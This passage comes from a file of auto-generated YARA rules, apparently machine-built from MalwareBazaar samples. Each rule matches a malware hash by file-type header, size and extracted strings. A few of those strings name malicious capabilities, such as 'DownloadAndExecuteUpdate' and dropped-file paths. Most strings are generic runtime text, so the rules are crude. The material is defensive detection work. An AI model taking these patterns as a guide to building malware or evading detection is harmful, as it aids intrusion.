        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB and
        all of them
}

rule Windows_b7b5a0f0f5e0df2055debbc9e1a5b7c96b0170b24b21cd66ecb272c070d5fa9f
{
    meta:
        description = "Auto ML: b7b5a0f0f5e0df2055debbc9e1a5b7c96b0170b24b21cd66ecb272c070d5fa9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<FrmMain_Load>b__2_0"
        $s5 = "<FrmMain_Load>b__2_1"
        $s6 = "<FrmMain_Load>b__2_2"
        $s7 = "<Module>"
        $s8 = "set_SpeedX"
        $s9 = "System.Collections.Generic"
        $s10 = "Read"
        $s11 = "Thread"
        $s12 = "add_Load"
        $s13 = "FrmMain_Load"
        $s14 = "get_OrangeRed"
        $s15 = "get_Speed"
        $s16 = "set_Speed"
        $s17 = "get_Enabled"
        $s18 = "set_Enabled"
        $s19 = "set_DoubleBuffered"
        $s20 = "connected"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 631KB and
        all of them
}

rule Linux_b7b62436f18ee4fa5b210d099271976d9a7b02dcce605703358a8c68372de063
{
    meta:
        description = "Auto ML: b7b62436f18ee4fa5b210d099271976d9a7b02dcce605703358a8c68372de063"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<l>=)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 13KB and
        all of them
}

rule Windows_b7c0f7b80c62db35dd345117351e8d872d698b13bb6f72a300a917d3e5680e6f
{
    meta:
        description = "Auto ML: b7c0f7b80c62db35dd345117351e8d872d698b13bb6f72a300a917d3e5680e6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetFiltes>b__0"
        $s5 = "PROCESSENTRY32"
        $s6 = "Microsoft.Win32"
        $s7 = "ReadInt32"
        $s8 = "WriteUInt64"
        $s9 = "GetAsUInt64"
        $s10 = "SetAsUInt64"
        $s11 = "InvalidImageWin16"
        $s12 = "ReadInt16"
        $s13 = "<Module>"
        $s14 = "ES_SYSTEM_REQUIRED"
        $s15 = "GetTypeFromCLSID"
        $s16 = "th32ModuleID"
        $s17 = "th32ProcessID"
        $s18 = "th32ParentProcessID"
        $s19 = "get_FormatID"
        $s20 = "get_ASCII"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 63KB and
        all of them
}

rule Windows_b7e8263a9210b8d4b85e957fd5cf0d23626926f7e41c1df3bbe468d12609d6e6
{
    meta:
        description = "Auto ML: b7e8263a9210b8d4b85e957fd5cf0d23626926f7e41c1df3bbe468d12609d6e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GetProcessWindowStation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 810KB and
        all of them
}

rule Windows_b7ff60dd4a04629b392b28542a830553cd6dd560cbc66bb710fbac465ddf4d1e
{
    meta:
        description = "Auto ML: b7ff60dd4a04629b392b28542a830553cd6dd560cbc66bb710fbac465ddf4d1e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3816KB and
        all of them
}

rule Windows_b839a06030277c44e842557ceb98ff7e06861b93c0922c61b47bd45bcf208408
{
    meta:
        description = "Auto ML: b839a06030277c44e842557ceb98ff7e06861b93c0922c61b47bd45bcf208408"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Whirtles.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ConnectionProvider"
        $s8 = "ConfigReader"
        $s9 = "FileScanning"
        $s10 = "FileSearcher"
        $s11 = "OpenVPN"
        $s12 = "System.Windows.Forms"
        $s13 = "QueryProcessor"
        $s14 = "QueryCmd"
        $s15 = "DownloadAndExecuteUpdate"
        $s16 = "DownloadUpdate"
        $s17 = "OpenUpdate"
        $s18 = "FileExt"
        $s19 = "UserExt"
        $s20 = "FileUtil"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 300KB and
        all of them
}

rule Windows_b8410c46b62f3f4fa0255c4fa37c4899f2fa7ee69883d35bd178e629e2db24db
{
    meta:
        description = "Auto ML: b8410c46b62f3f4fa0255c4fa37c4899f2fa7ee69883d35bd178e629e2db24db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "#Visibility modifier already defined"
        $s6 = "3Identifier already in use;;'{0}' is already defined"
        $s7 = "~This constructor or property getter/setter method is not meant to be called directly;;'{0}' is not meant to be called directly"
        $s8 = "@The get and set methods of this property do not match each other"
        $s9 = ":A custom attribute class must derive from System.Attribute"
        $s10 = "_Cannot define get_Item or set_Item on an Expando class. Methods reserved for the expando fields"
        $s11 = "mBase class defines get_Item or set_Item, cannot create expando class. Methods reserved for the expando fields"
        $s12 = "MA base class is already marked expando; current specification will be ignored"
        $s13 = "1Member is not deleteable;;'{0}' is not deleteable"
        $s14 = "xMethod in base has a different return type;;Method '{0}' is already defined in a base class with a different return type"
        $s15 = ")Cannot use 'override' and 'hide' together"
        $s16 = "bExpected ','. Write 'identifier : Type' rather than 'Type identifier' to declare a typed parameter"
        $s17 = "5Too many errors. The file might not be a JScript file"
        $s18 = "eSyntax error. Write 'var identifier : Type' rather than 'Type identifier' to declare a typed variable"
        $s19 = "vSyntax error. Write 'function identifier(...) : Type{' rather than 'Type identifier(...){' to declare a typed function"
        $s20 = "fInvalid property declaration. The getter must not have arguments and the setter must have one argument"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 431KB and
        all of them
}

rule Windows_b852a910668d96c99c4871a22e8f12f83c120949e2db5a2daf4123dff6929553
{
    meta:
        description = "Auto ML: b852a910668d96c99c4871a22e8f12f83c120949e2db5a2daf4123dff6929553"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Core"
        $s13 = "System.Windows.Markup"
        $s14 = "System.Xaml"
        $s15 = "System.Diagnostics.CodeAnalysis"
        $s16 = "System.Security"
        $s17 = "SecurityRuleSet"
        $s18 = "strict_rules_for_installation_on_pcs.exe"
        $s19 = "<Module>"
        $s20 = "ThreadSafeObjectProvider`1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4030KB and
        all of them
}

rule Windows_b86925369c2833010ca7b6d0f0b6711ab2c9ab6b54ab9742e56865e6217acf37
{
    meta:
        description = "Auto ML: b86925369c2833010ca7b6d0f0b6711ab2c9ab6b54ab9742e56865e6217acf37"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "[Program Files]"
        $s6 = "D:\\Program Files\\Microsoft Visual Studio 9.0\\VC\\atlmfc\\include\\afxwin1.inl"
        $s7 = "Open"
        $s8 = "Shell"
        $s9 = "Uninstall File"
        $s10 = "[HKEY_USERS"
        $s11 = "[HKEY_CURRENT_USER"
        $s12 = "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
        $s13 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
        $s14 = "C:\\Program Files"
        $s15 = "FileLink"
        $s16 = "HTTP://"
        $s17 = "UnInstallFileLink"
        $s18 = "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"
        $s19 = "\\Ying-UnInstall.exe"
        $s20 = "GetUserAppInfo.exe"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8056KB and
        all of them
}

rule Windows_12f842c1065cf459f3e9fccf3abd75cc37af8f65c06bc7e93f29ec2cbdba9832
{
    meta:
        description = "Auto ML: 12f842c1065cf459f3e9fccf3abd75cc37af8f65c06bc7e93f29ec2cbdba9832"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "RegOpenKeyExW"
        $s13 = "RegCreateKeyExW"
        $s14 = "ADVAPI32.dll"
        $s15 = "SHFileOperationW"
        $s16 = "SHGetFileInfoW"
        $s17 = "SHGetPathFromIDListW"
        $s18 = "ShellExecuteExW"
        $s19 = "SHELL32.dll"
        $s20 = "CoCreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB and
        all of them
}

rule Windows_b86c596eb340e3083477d65046ace9dbd21a4fe8ff4f3b6e1dd12508ab9099d8
{
    meta:
        description = "Auto ML: b86c596eb340e3083477d65046ace9dbd21a4fe8ff4f3b6e1dd12508ab9099d8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<get_Items>b__5_0"
        $s5 = "HashSet`1"
        $s6 = "get_DataTable1"
        $s7 = "get_DataColumn1"
        $s8 = "set_DataColumn1"
        $s9 = "DataSet1"
        $s10 = "<get_Connectors>d__12"
        $s11 = "get_DataColumn2"
        $s12 = "set_DataColumn2"
        $s13 = "<connection>5__3"
        $s14 = "get_DataColumn3"
        $s15 = "set_DataColumn3"
        $s16 = "<Module>"
        $s17 = "System.Drawing.Drawing2D"
        $s18 = "System.IO"
        $s19 = "get_uNNT"
        $s20 = "System.Xml.Schema"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 570KB and
        all of them
}

rule Linux_b8a78216d6f5375b58799711ddf70519790f24454e21b2ccd0b80179c13de79e
{
    meta:
        description = "Auto ML: b8a78216d6f5375b58799711ddf70519790f24454e21b2ccd0b80179c13de79e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Windows_b8b2ae812b47196a7be9ec41d6186eeaf28f2924b906299995db446be091d5e0
{
    meta:
        description = "Auto ML: b8b2ae812b47196a7be9ec41d6186eeaf28f2924b906299995db446be091d5e0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 204KB and
        all of them
}

rule Linux_b8f289fadbf32bcd3c562041c6b84f34a38370938140b125d692e2ff46375422
{
    meta:
        description = "Auto ML: b8f289fadbf32bcd3c562041c6b84f34a38370938140b125d692e2ff46375422"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Linux_b900c521650c7881da93a3cfbb8724e5069a7e50f57da305d17ff1fe99fba2ea
{
    meta:
        description = "Auto ML: b900c521650c7881da93a3cfbb8724e5069a7e50f57da305d17ff1fe99fba2ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "PATCH /%s HTTP/1.1"
        $s5 = "User-Agent: %s"
        $s6 = "Connection: close"
        $s7 = "OpenSuse"
        $s8 = "OpenWRT"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 81KB and
        all of them
}

rule Windows_b90a5b9a5ee5305fdb4bbaa5992849e15942037bafe241eb965325e5bd056f49
{
    meta:
        description = "Auto ML: b90a5b9a5ee5305fdb4bbaa5992849e15942037bafe241eb965325e5bd056f49"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4432KB and
        all of them
}

rule Windows_b9123eff82d12c62b247a51cdb9ea2b166d38f1ec8dba8b6ef9be868e44eda15
{
    meta:
        description = "Auto ML: b9123eff82d12c62b247a51cdb9ea2b166d38f1ec8dba8b6ef9be868e44eda15"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = ">RcmD)P&U"
        $s6 = "WINQ"
        $s7 = "JseT="
        $s8 = "<Module>"
        $s9 = "newrock.exe"
        $s10 = "Writer"
        $s11 = "System"
        $s12 = "System.Collections.Generic"
        $s13 = "fileNames"
        $s14 = "fileTypes"
        $s15 = "fileRunTypes"
        $s16 = "fileDropPaths"
        $s17 = "GetResource"
        $s18 = "WriteAllBytes"
        $s19 = "GetModuleHandle"
        $s20 = "file"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6610KB and
        all of them
}

rule Linux_b921cea2f6ff86df25de69e5f50c907dddaef510ebc0e48ae958700d3d4e738e
{
    meta:
        description = "Auto ML: b921cea2f6ff86df25de69e5f50c907dddaef510ebc0e48ae958700d3d4e738e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 152KB and
        all of them
}

rule Linux_ba5d6041f11bb74230034ab1f3f4a9cb206fcc6924459031214b033a8aecca79
{
    meta:
        description = "Auto ML: ba5d6041f11bb74230034ab1f3f4a9cb206fcc6924459031214b033a8aecca79"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB and
        all of them
}

rule Windows_baaa618702b0ed65594c6e93e9cb6003315fd12ae68e2fda5548f9f1752f6109
{
    meta:
        description = "Auto ML: baaa618702b0ed65594c6e93e9cb6003315fd12ae68e2fda5548f9f1752f6109"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6622KB and
        all of them
}

rule Windows_0139a0a3cc53046587aa8ae1035f923cc3be9dd9490b4192ed912d62ac84bb03
{
    meta:
        description = "Auto ML: 0139a0a3cc53046587aa8ae1035f923cc3be9dd9490b4192ed912d62ac84bb03"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_1336fafe5a37ce0a8487d349484b679fe5745c965027483bae09015d09ddb866
{
    meta:
        description = "Auto ML: 1336fafe5a37ce0a8487d349484b679fe5745c965027483bae09015d09ddb866"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = "`.rdata"
        $s5 = "@.data"
        $s6 = ".rsrc"
        $s7 = "CorExitProcess"
        $s8 = "FlsSetValue"
        $s9 = "FlsGetValue"
        $s10 = "An application has made an attempt to load the C runtime library incorrectly."
        $s11 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s12 = "- Attempt to initialize the CRT more than once."
        $s13 = "- unable to open console device"
        $s14 = "- unexpected multithread lock error"
        $s15 = "- not enough space for thread data"
        $s16 = "- floating point support not loaded"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1056KB and
        all of them
}

rule Linux_baccfe00837fe4ed8b6ebfdc02c2b198054a9ee11e4b7e0475e5abe60f91b033
{
    meta:
        description = "Auto ML: baccfe00837fe4ed8b6ebfdc02c2b198054a9ee11e4b7e0475e5abe60f91b033"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "b-GEtD"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
        $s3 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 56KB and
        all of them
}

rule Windows_baf1ef6054b6f5218ae5c53b563d80f8a6bfc96a486e25550f613c9a4024634b
{
    meta:
        description = "Auto ML: baf1ef6054b6f5218ae5c53b563d80f8a6bfc96a486e25550f613c9a4024634b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "too many files"
        $s6 = "invalid filename"
        $s7 = "file too large"
        $s8 = "file not found"
        $s9 = "file stat failed"
        $s10 = "file open failed"
        $s11 = "file seek failed"
        $s12 = "write callback failed"
        $s13 = "file write failed"
        $s14 = "file create failed"
        $s15 = "file close failed"
        $s16 = "file read failed"
        $s17 = "Windows Vista"
        $s18 = "Windows Server 2008"
        $s19 = "Windows 8"
        $s20 = "Windows 7"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 386KB and
        all of them
}

rule Windows_bb68113cfaba1def162b8a0df4b1d41b83ea34ce4fd5b23e0a0b75b259b62bfc
{
    meta:
        description = "Auto ML: bb68113cfaba1def162b8a0df4b1d41b83ea34ce4fd5b23e0a0b75b259b62bfc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "Montgomery Multiplication for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s7 = "SHA1 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s8 = "SHA256 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s9 = "SHA512 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s10 = "GF(2^m) Multiplication for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s11 = "AES for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s12 = "AES for Intel AES-NI, CRYPTOGAMS by <appro@openssl.org>"
        $s13 = "GHASH for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s14 = "D$ http"
        $s15 = "File is already registered:"
        $s16 = "CHECK failed: (descriptor->file()->pool()) == (DescriptorPool::generated_pool()):"
        $s17 = "Tried to register a non-generated type with the generated type registry."
        $s18 = "Type is already registered:"
        $s19 = "\" implements neither SetCachedSize() nor ByteSize().  Must implement one or the other."
        $s20 = "File appears to be in generated pool but wasn't registered:"
    condition:
